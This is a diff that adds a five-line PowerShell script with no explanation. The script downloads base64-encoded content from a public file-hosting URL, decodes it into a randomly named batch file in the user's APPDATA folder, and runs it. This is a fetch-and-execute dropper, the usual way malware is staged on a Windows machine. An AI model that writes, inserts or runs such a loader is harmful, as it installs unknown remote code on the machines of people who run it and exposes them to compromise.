@@ -1,0 +1,5 @@
+$base64 = (iwr -Uri 'https://files.catbox.moe/izt6l9.txt ').Content
+$bytes = [System.Convert]::FromBase64String($base64)
+$path = [System.IO.Path]::Combine($env:APPDATA, '4urtoBs4.bat')
+[System.IO.File]::WriteAllBytes($path, $bytes)
+Start-Process -FilePath $path
